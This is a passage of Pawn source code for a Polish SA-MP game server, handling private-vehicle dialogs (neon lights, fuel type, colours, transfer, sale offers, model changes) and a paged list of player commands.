						new Float:x, Float:y, Float:z, Float:z_angle;
                		GetVehiclePos(ppVeh[selprivcar],Float:x,Float:y,Float:z);
                		GetVehicleZAngle(ppVeh[selprivcar],Float:z_angle);
                		pObject[selprivcar][2] = CreateObject(18648,px,py,pz,prx,pry,prz,10);
                		pObject[selprivcar][3] = CreateObject(18648,px,py,pz,prx,pry,prz,10);
                		AttachObjectToVehicle(pObject[selprivcar][2],ppVeh[selprivcar],0.9004, 0.1164, -0.4655,0);
                		AttachObjectToVehicle(pObject[selprivcar][3],ppVeh[selprivcar],-0.8706, 0.0570, -0.4655,0);
                		pNeon[selprivcar] = 1;
            		}
            		case 2:
            		{
            		    if(pNeon[selprivcar] != -1) return SendClientMessage(playerid, RED, "Zdejmij aktualne neony przed za³o¿eniem nowych.");
            		    new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
						new Float:x, Float:y, Float:z, Float:z_angle;
                		GetVehiclePos(ppVeh[selprivcar],Float:x,Float:y,Float:z);
                		GetVehicleZAngle(ppVeh[selprivcar],Float:z_angle);
                		pObject[selprivcar][4] = CreateObject(18649,px,py,pz,prx,pry,prz,10);
                		pObject[selprivcar][5] = CreateObject(18649,px,py,pz,prx,pry,prz,10);
                		AttachObjectToVehicle(pObject[selprivcar][4],ppVeh[selprivcar],0.9004, 0.1164, -0.4655,0);
                		AttachObjectToVehicle(pObject[selprivcar][5],ppVeh[selprivcar],-0.8706, 0.0570, -0.4655,0);
                		pNeon[selprivcar] = 2;
            		}
            		case 3:
            		{
            		    if(pNeon[selprivcar] != -1) return SendClientMessage(playerid, RED, "Zdejmij aktualne neony przed za³o¿eniem nowych.");
            		    new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
						new Float:x, Float:y, Float:z, Float:z_angle;
                		GetVehiclePos(ppVeh[selprivcar],Float:x,Float:y,Float:z);
                		GetVehicleZAngle(ppVeh[selprivcar],Float:z_angle);
                		pObject[selprivcar][6] = CreateObject(18650,px,py,pz,prx,pry,prz,10);
                		pObject[selprivcar][7] = CreateObject(18650,px,py,pz,prx,pry,prz,10);
                		AttachObjectToVehicle(pObject[selprivcar][6],ppVeh[selprivcar],0.9004, 0.1164, -0.4655,0);
                		AttachObjectToVehicle(pObject[selprivcar][7],ppVeh[selprivcar],-0.8706, 0.0570, -0.4655,0);
                		pNeon[selprivcar] = 3;
            		}
            		case 4:
            		{
            		    if(pNeon[selprivcar] != -1) return SendClientMessage(playerid, RED, "Zdejmij aktualne neony przed za³o¿eniem nowych.");
            		    new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
						new Float:x, Float:y, Float:z, Float:z_angle;
                		GetVehiclePos(ppVeh[selprivcar],Float:x,Float:y,Float:z);
                		GetVehicleZAngle(ppVeh[selprivcar],Float:z_angle);
                		pObject[selprivcar][8] = CreateObject(18651,px,py,pz,prx,pry,prz,10);
                		pObject[selprivcar][9] = CreateObject(18651,px,py,pz,prx,pry,prz,10);
                		AttachObjectToVehicle(pObject[selprivcar][8],ppVeh[selprivcar],0.9004, 0.1164, -0.4655,0);
                		AttachObjectToVehicle(pObject[selprivcar][9],ppVeh[selprivcar],-0.8706, 0.0570, -0.4655,0);
                		pNeon[selprivcar] = 4;
            		}
            		case 5:
            		{
              		    if(pNeon[selprivcar] != -1) return SendClientMessage(playerid, RED, "Zdejmij aktualne neony przed za³o¿eniem nowych.");
            		    new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
						new Float:x, Float:y, Float:z, Float:z_angle;
                		GetVehiclePos(ppVeh[selprivcar],Float:x,Float:y,Float:z);
                		GetVehicleZAngle(ppVeh[selprivcar],Float:z_angle);
                		pObject[selprivcar][10] = CreateObject(18652,px,py,pz,prx,pry,prz,10);
                		pObject[selprivcar][11] = CreateObject(18652,px,py,pz,prx,pry,prz,10);
                		AttachObjectToVehicle(pObject[selprivcar][10],ppVeh[selprivcar],0.9004, 0.1164, -0.4655,0);
                		AttachObjectToVehicle(pObject[selprivcar][11],ppVeh[selprivcar],-0.8706, 0.0570, -0.4655,0);
                		pNeon[selprivcar] = 5;
            		}
            		case 6:
            		{
            		    if(pNeon[selprivcar] == -1) return 1;
						if(pNeon[selprivcar] == 0)
						{
						    DestroyObject(pObject[selprivcar][0]);
						    DestroyObject(pObject[selprivcar][1]);
						}
						if(pNeon[selprivcar] == 1)
						{
						    DestroyObject(pObject[selprivcar][2]);
						    DestroyObject(pObject[selprivcar][3]);
						}
						if(pNeon[selprivcar] == 2)
						{
						    DestroyObject(pObject[selprivcar][4]);
						    DestroyObject(pObject[selprivcar][5]);
						}
						if(pNeon[selprivcar] == 3)
						{
						    DestroyObject(pObject[selprivcar][6]);
						    DestroyObject(pObject[selprivcar][7]);
						}
						if(pNeon[selprivcar] == 4)
						{
						    DestroyObject(pObject[selprivcar][8]);
						    DestroyObject(pObject[selprivcar][9]);
						}
						if(pNeon[selprivcar] == 5)
						{
						    DestroyObject(pObject[selprivcar][10]);
						    DestroyObject(pObject[selprivcar][11]);
						}
                		pNeon[selprivcar] = -1;
            		}
		    	}
			}
		}
		case DIALOG_PRIVCARFUEL:
		{
		    if(!response) return 1;
		    if(response)
		    {
		        new selprivcar;
				Loop(privcarid, privcars) { if(pOwner[privcarid] == Player[playerid][ID]) selprivcar = privcarid; }
		        switch(listitem)
		        {
		            case 0:
		            {
		                if(pFuelT[selprivcar] == 0) return SendClientMessage(playerid, RED, "Posiadasz ju¿ ten rodzaj paliwa w swoim pojeŸdzie.");
						if(Player[playerid][Exp] < 500) return SendClientMessage(playerid, RED, "Nie posiadasz wystarczaj¹cej iloœci EXP.");
						pFuelT[selprivcar] = 0;
						Player[playerid][Exp] -= 500;
						SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Rodzaj paliwa zmieniony na "C_WHITE"95"C_LOLIVE".");
		            }
		            case 1:
		            {
		                if(pFuelT[selprivcar] == 1) return SendClientMessage(playerid, RED, "Posiadasz ju¿ ten rodzaj paliwa w swoim pojeŸdzie.");
						if(Player[playerid][Exp] < 1500) return SendClientMessage(playerid, RED, "Nie posiadasz wystarczaj¹cej iloœci EXP.");
						pFuelT[selprivcar] = 1;
						Player[playerid][Exp] -= 1500;
						SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Rodzaj paliwa zmieniony na "C_WHITE"98"C_LOLIVE".");
		            }
		            case 2:
		            {
		                if(pFuelT[selprivcar] == 2) return SendClientMessage(playerid, RED, "Posiadasz ju¿ ten rodzaj paliwa w swoim pojeŸdzie.");
						if(Player[playerid][Exp] < 3000) return SendClientMessage(playerid, RED, "Nie posiadasz wystarczaj¹cej iloœci EXP.");
						pFuelT[selprivcar] = 2;
						Player[playerid][Exp] -= 3000;
						SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Rodzaj paliwa zmieniony na "C_WHITE"ON"C_LOLIVE".");
		            }
		            case 3:
		            {
		                if(pFuelT[selprivcar] == 3) return SendClientMessage(playerid, RED, "Posiadasz ju¿ ten rodzaj paliwa w swoim pojeŸdzie.");
						if(Player[playerid][Exp] < 10000) return SendClientMessage(playerid, RED, "Nie posiadasz wystarczaj¹cej iloœci EXP.");
						pFuelT[selprivcar] = 3;
						Player[playerid][Exp] -= 10000;
						SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Rodzaj paliwa zmieniony na "C_WHITE"LPG"C_LOLIVE".");
		            }
		        }
		    }
		}
		case DIALOG_PRIVCARKOLOR1:
		{
		    if(!response) return 1;
		    if(response)
		    {
				if(!IsNumeric(inputtext)) return 1;
				new kolor1 = strval(inputtext);
				if(kolor1 < 0 || kolor1 > 255) return SendClientMessage(playerid, RED, "Nieprawid³owy kolor.");
				PrivcarKolor[playerid][0] = kolor1;
				return ShowPlayerDialog(playerid, DIALOG_PRIVCARKOLOR2, DIALOG_STYLE_INPUT, ""C_BLUE1"Prywatny pojazd - zmiana koloru", ""C_BLUE1"WprowadŸ poni¿ej drugi kolor dla Twojego pojazdu.", "Wybierz", "Zamknij");
		    }
		}
		case DIALOG_PRIVCARKOLOR2:
		{
		    if(!response) return 1;
		    if(response)
		    {
				if(!IsNumeric(inputtext)) return 1;
				new kolor2 = strval(inputtext);
				if(kolor2 < 0 || kolor2 > 255) return SendClientMessage(playerid, RED, "Nieprawid³owy kolor.");
				PrivcarKolor[playerid][1] = kolor2;
				Loop(privcarid, privcars)
				{
				   	if(pOwner[privcarid] == Player[playerid][ID])
				   	{
						pColor[privcarid][0] = PrivcarKolor[playerid][0];
						pColor[privcarid][1] = PrivcarKolor[playerid][1];
						ChangeVehicleColor(ppVeh[privcarid], PrivcarKolor[playerid][0], PrivcarKolor[playerid][1]);
						SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Kolory prywatnego pojazdu zosta³y zmienione.");
					}
				}
		    }
		}
		case DIALOG_PRIVCARTAKE:
		{
		    if(!response) return 1;
		    if(response)
		    {
				if(!IsNumeric(inputtext)) return 1;
				new id = strval(inputtext);
				if(!IsPlayerConnected(id) || !Player[id][IsLoggedIn] || id == playerid) return SendClientMessage(playerid, RED, "Nieprawid³owe ID gracza.");
				if(HavePrivcar[id]) return SendClientMessage(playerid, RED, "Podany gracz posiada ju¿ prywatny pojazd.");
				Loop(privcarid, privcars)
				{
				   	if(pOwner[privcarid] == Player[playerid][ID])
				   	{
				   	    if(IsPlayerInVehicle(playerid, ppVeh[privcarid])) RemovePlayerFromVehicle(playerid);
						HavePrivcar[id] = true;
				   	    HavePrivcar[playerid] = false;
						pOwner[privcarid] = Player[id][ID];
						format(pOwnerN[privcarid], 20, "%s", Player[id][Name]);
						m_query("UPDATE privcars SET ownername = '%s', ownerid = %d WHERE cid = %d", pOwnerN[privcarid], pOwner[privcarid], privcarid);
						new tdstr[256];
						if(pFuelT[privcarid] == 0) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(95, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
						if(pFuelT[privcarid] == 1) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(98, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
						if(pFuelT[privcarid] == 2) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(ON, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
						if(pFuelT[privcarid] == 3) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(LPG, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
						Update3DTextLabelText(pText[privcarid], -1, tdstr);
						SaveAllData(id);
						SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Prywatny pojazd oddany.");
						SendClientMessage(id, -1, ""PLUS""C_LOLIVE"Otrzyma³eœ prywatny pojazd.");
						SaveAllData(playerid);
					}
				}
		    }
		}
		case DIALOG_PRIVCAROFFER:
		{
		    if(!response) return 1;
		    if(response)
		    {
				if(!IsNumeric(inputtext)) return 1;
				new id = strval(inputtext);
				if(!IsPlayerConnected(id) || !Player[id][IsLoggedIn] || id == playerid) return SendClientMessage(playerid, RED, "Nieprawid³owe ID gracza.");
				if(HavePrivcar[id]) return SendClientMessage(playerid, RED, "Podany gracz posiada ju¿ prywatny pojazd");
				pOffer[playerid] = id;
				pOffer[id] = playerid;
				return ShowPlayerDialog(playerid, DIALOG_PRIVCAROFFER2, DIALOG_STYLE_INPUT, ""C_BLUE1"Z³o¿ ofertê sprzeda¿y", ""C_WHITE"Wpisz cenê w EXP, za jak¹ chcesz sprzedaæ Swój pojazd.", "Wybierz", "Zamknij");
			}
		}
		case DIALOG_PRIVCAROFFER2:
		{
		    if(!response) return 1;
		    if(response)
		    {
				if(!IsNumeric(inputtext)) return 1;
				new score = strval(inputtext);
				new offeredid = pOffer[playerid];
				pOfferExp[offeredid] = score;
				SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Oferta sprzeda¿y wys³ana.");
				new offerstr[256];
				format(offerstr, sizeof(offerstr), ""PLUS""C_NICK"%s(%d) "C_LOLIVE"wysy³a Ci ofertê sprzeda¿y swojego pojazdu za "C_WHITE"%d EXP"C_LOLIVE".");
				SendClientMessage(offeredid, -1, offerstr);
				format(offerstr, sizeof(offerstr), ""PLUS""C_LOLIVE"Zapoznaj siê z pojazdem. Gdy siê zdecydujesz, mo¿esz go kupiæ przez "C_WHITE"/buy %d"C_LOLIVE".", pOffer[offeredid]);
				SendClientMessage(offeredid, -1, offerstr);
			}
		}
		case DIALOG_PRIVCARMODEL:
		{
		    if(!response) return 1;
		    if(response)
		    {
				new Vehicle[32], VehicleID;
				if(Player[playerid][Exp] < 5000) return DialogError(playerid, "{FFFF00}Zmiana modelu prywatnego pojazdu kosztuje "C_WHITE"5000 EXP{FFFF00}.");
				if(privcars >= MAX_PRIVCARS) return DialogError(playerid, "{FFFF00}Osi¹gniêto limit prywatnych pojazdów.");
 			    if(isnull(inputtext)) return 1;
				format(Vehicle, sizeof(Vehicle), "%s", inputtext);
				if(!IsNumeric(Vehicle)) {
 					VehicleID = GetVehicleModelIDFromName(Vehicle);
					if(validModel(VehicleID) || Restricted(VehicleID)) return SendClientMessage(playerid, RED, "Nieprawid³owa nazwa pojazdu lub pojazd jest zabroniony."); }
				else {
	    			VehicleID = strval(Vehicle);
					if(validModel(VehicleID) || Restricted(VehicleID)) return SendClientMessage(playerid, RED, "Nieprawid³owe ID pojazdu."); }
				Loop(privcarid, privcars)
				{
				   	if(pOwner[privcarid] == Player[playerid][ID])
				   	{
				   	    new s[1024], comp[14];
						pModel[privcarid] = VehicleID;
    					if(pNeon[privcarid] == 0)
						{
						    DestroyObject(pObject[privcarid][0]);
						    DestroyObject(pObject[privcarid][1]);
						}
						if(pNeon[privcarid] == 1)
						{
						    DestroyObject(pObject[privcarid][2]);
						    DestroyObject(pObject[privcarid][3]);
						}
						if(pNeon[privcarid] == 2)
						{
						    DestroyObject(pObject[privcarid][4]);
						    DestroyObject(pObject[privcarid][5]);
						}
						if(pNeon[privcarid] == 3)
						{
						    DestroyObject(pObject[privcarid][6]);
						    DestroyObject(pObject[privcarid][7]);
						}
						if(pNeon[privcarid] == 4)
						{
						    DestroyObject(pObject[privcarid][8]);
						    DestroyObject(pObject[privcarid][9]);
						}
						if(pNeon[privcarid] == 5)
						{
						    DestroyObject(pObject[privcarid][10]);
						    DestroyObject(pObject[privcarid][11]);
						}
						DestroyVehicle(ppVeh[privcarid]);
						Delete3DTextLabel(pText[privcarid]);
						pUpgrade[privcarid] = 0;
						ppVeh[privcarid] = CreateVehicle(pModel[privcarid], prX[privcarid], prY[privcarid], prZ[privcarid], prA[privcarid], pColor[privcarid][0], pColor[privcarid][1], -1, 0);
						SetPrivcarHandling(privcarid);
						new tdstr[256];
						if(pFuelT[privcarid] == 0) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(95, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
						if(pFuelT[privcarid] == 1) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(98, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
						if(pFuelT[privcarid] == 2) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(ON, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
						if(pFuelT[privcarid] == 3) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(LPG, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
						pText[privcarid] = Create3DTextLabel(tdstr, WHITE, 0.0, 0.0, 0.0, 30.0, 0, 0);
						Attach3DTextLabelToVehicle(pText[privcarid], ppVeh[privcarid], 0.0, 0.0, 0.0);
						m_query("SELECT comp FROM privcars WHERE cid = %d", privcarid);
						mysql_store_result();
						mysql_fetch_row(s, " ");
						mysql_free_result();
						sscanf(s, "a<i>[14]",comp);
						addVehicleComponent(ppVeh[privcarid], comp[0], comp[1], comp[2], comp[3], comp[4], comp[5], comp[6], comp[7], comp[8], comp[9], comp[10], comp[11], comp[12], comp[13]);
						if(pNeon[privcarid] == 0)
						{
                		    new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
							new Float:x, Float:y, Float:z, Float:z_angle;
                			GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                			GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           	pObject[privcarid][0] = CreateObject(18647,px,py,pz,prx,pry,prz,10);
            				pObject[privcarid][1] = CreateObject(18647,px,py,pz,prx,pry,prz,10);
               				AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              				AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0);
						}
						if(pNeon[privcarid] == 1)
						{
                		    new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
							new Float:x, Float:y, Float:z, Float:z_angle;
                			GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                			GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           	pObject[privcarid][0] = CreateObject(18648,px,py,pz,prx,pry,prz,10);
            				pObject[privcarid][1] = CreateObject(18648,px,py,pz,prx,pry,prz,10);
               				AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              				AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0);
						}
						if(pNeon[privcarid] == 2)
						{
                		    new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
							new Float:x, Float:y, Float:z, Float:z_angle;
                			GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                			GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           	pObject[privcarid][0] = CreateObject(18649,px,py,pz,prx,pry,prz,10);
            				pObject[privcarid][1] = CreateObject(18649,px,py,pz,prx,pry,prz,10);
               				AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              				AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0);
						}
						if(pNeon[privcarid] == 3)
						{
                		    new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
							new Float:x, Float:y, Float:z, Float:z_angle;
                			GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                			GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           	pObject[privcarid][0] = CreateObject(18650,px,py,pz,prx,pry,prz,10);
            				pObject[privcarid][1] = CreateObject(18650,px,py,pz,prx,pry,prz,10);
               				AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              				AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0);
						}
						if(pNeon[privcarid] == 4)
						{
                		    new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
							new Float:x, Float:y, Float:z, Float:z_angle;
                			GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                			GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           	pObject[privcarid][0] = CreateObject(18651,px,py,pz,prx,pry,prz,10);
            				pObject[privcarid][1] = CreateObject(18651,px,py,pz,prx,pry,prz,10);
               				AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              				AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0);
						}
						if(pNeon[privcarid] == 5)
						{
                		    new Float:px, Float:py, Float:pz, Float:prx, Float:pry, Float:prz;
							new Float:x, Float:y, Float:z, Float:z_angle;
                			GetVehiclePos(ppVeh[privcarid],Float:x,Float:y,Float:z);
                			GetVehicleZAngle(ppVeh[privcarid],Float:z_angle);
				           	pObject[privcarid][0] = CreateObject(18652,px,py,pz,prx,pry,prz,10);
            				pObject[privcarid][1] = CreateObject(18652,px,py,pz,prx,pry,prz,10);
               				AttachObjectToVehicle(pObject[privcarid][0],ppVeh[privcarid],0.9004, 0.1164, -0.4655,0);
              				AttachObjectToVehicle(pObject[privcarid][1],ppVeh[privcarid],-0.8706, 0.0570, -0.4655,0);
						}
						PutPlayerInVehicle(playerid, ppVeh[privcarid], 0);
						Player[playerid][Exp] -= 5000;
						SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Model prywatnego pojazdu zmieniony.");
					}
				}
		    }
		}
		case DIALOG_CMD1:
		{
		    new cmdstr[2048];
		    if(response)
		    {
				format(cmdstr, sizeof(cmdstr), ""C_BLUE1"/zbierz "C_WHITE"(Zbierasz posadzon¹ roœlinê)\n");
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/top "C_WHITE"(Sprawdzasz ranking TOP 10)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/lopata "C_WHITE"(Dostajesz ³opatê)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/zw "C_WHITE"(Uruchamiasz status ZW)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/jj "C_WHITE"(Wychodzisz ze statusu ZW)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/kod "C_WHITE"(Przepisywanie kodu za pomoc¹ komendy)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/liczba "C_WHITE"(Rozwi¹zywanie równania za pomoc¹ komendy)", cmdstr);
				return ShowPlayerDialog(playerid, DIALOG_CMD2, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Komendy gracza (2/12)", cmdstr, "Dalej", "Zamknij");
		    }
		    else return 1;
		}
		case DIALOG_CMD2:
		{
		    new cmdstr[2048];
		    if(response)
		    {
				format(cmdstr, sizeof(cmdstr), ""C_BLUE1"/wyraz "C_WHITE"(Odgadywanie wyrazu za pomoc¹ komendy)\n");
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/kolory "C_WHITE"(Lista kolorów nicku)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/plate "C_WHITE"(Zmieniasz tablicê rejestracyjn¹)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/klastry "C_WHITE"(Sprawdzasz status klastrów)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/radio "C_WHITE"(Wyœwietla stacje radiowe)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/anims "C_WHITE"(Wyœwietla listê animacji)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/astop "C_WHITE"(Koñczy animacjê)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/opcje "C_WHITE"(Wyœwietla ustawienia konta)", cmdstr);
				return ShowPlayerDialog(playerid, DIALOG_CMD3, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Komendy gracza (3/12)", cmdstr, "Dalej", "Zamknij");
		    }
		    else return 1;
		}
		case DIALOG_CMD3:
		{
		    new cmdstr[2048];
		    if(response)
		    {
				format(cmdstr, sizeof(cmdstr), ""C_BLUE1"/bronie "C_WHITE"(Przegl¹dasz bronie do kupienia)\n");
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/is "C_WHITE"(Wyœwietla ItemShop)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/help "C_WHITE"(Wyœwietla okno pomocy)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/lchat "C_WHITE"(Pisanie na czacie lokalnym)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/wejdz "C_WHITE"(Wejœcie do domu)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/wyjdz "C_WHITE"(Wyjœcie z domu)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/tpdom "C_WHITE"(Teleportacja do swojego domu)", cmdstr);
				return ShowPlayerDialog(playerid, DIALOG_CMD4, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Komendy gracza (4/12)", cmdstr, "Dalej", "Zamknij");
		    }
		    else return 1;
		}
		case DIALOG_CMD4:
		{
		    new cmdstr[2048];
		    if(response)
		    {
				format(cmdstr, sizeof(cmdstr), ""C_BLUE1"/hpwd "C_WHITE"(Zmieniasz has³o do domu)\n");
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/dom "C_WHITE"(Wyœwietla panel domu)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/hkick "C_WHITE"(Wyrzucasz gracza z domu)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/freeh "C_WHITE"(Teleportacja do losowego, wolnego domu)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/tankuj "C_WHITE"(Tankujesz na stacji benzynowej)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/ramps "C_WHITE"(Zarz¹dzasz dostêpnoœci¹ ramp)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/tutorial "C_WHITE"(Uruchamiasz samouczek)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/smp "C_WHITE"(Zapisujesz prywatn¹ pozycjê)", cmdstr);
				return ShowPlayerDialog(playerid, DIALOG_CMD5, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Komendy gracza (5/12)", cmdstr, "Dalej", "Zamknij");
		    }
		    else return 1;
		}
		case DIALOG_CMD5:
		{
		    new cmdstr[2048];
		    if(response)
		    {
				format(cmdstr, sizeof(cmdstr), ""C_BLUE1"/lmp "C_WHITE"(Teleportujesz siê do prywatnej pozycji)\n");
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/loadpos "C_WHITE"(Teleport do zapisanej pozycji administracji)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/hitman "C_WHITE"(Wystawiasz nagrodê za zabicie gracza)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/sendexp "C_WHITE"(Przekazujesz EXP)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/sendcash "C_WHITE"(Przekazujesz gotówkê)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/naj "C_WHITE"(Uwa¿asz ten serwer za najlepszy)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/czas "C_WHITE"(Zmiana prywatnego czasu)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/szukam "C_WHITE"(Powiadamiasz, ¿e szukasz kolegi do gry)", cmdstr);
				return ShowPlayerDialog(playerid, DIALOG_CMD6, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Komendy gracza (6/12)", cmdstr, "Dalej", "Zamknij");
		    }
		    else return 1;
		}
		case DIALOG_CMD6:
		{
		    new cmdstr[2048];
		    if(response)
		    {
				format(cmdstr, sizeof(cmdstr), ""C_BLUE1"/like "C_WHITE"(Pokazujesz ³apkê w górê pobliskim graczom)\n");
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/odlicz "C_WHITE"(W³¹czasz odliczanie dla pobliskich graczy)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/up "C_WHITE"(Podnosisz siê w górê)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/losowanie "C_WHITE"(U¿ywasz losowania)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/siema "C_WHITE"(Witasz siê z graczami)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/nara "C_WHITE"(¯egnasz siê z graczami)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/gz "C_WHITE"(Automatyczne gratulacje dla innego gracza)\n", cmdstr);
				format(cmdstr, sizeof(cmdstr), "%s"C_BLUE1"/do "C_WHITE"(Akcja RP lub wiadomoœæ do innego gracza)", cmdstr);
				return ShowPlayerDialog(playerid, DIALOG_CMD7, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Komendy gracza (7/12)", cmdstr, "Dalej", "Zamknij");
		    }
		    else return 1;
		}
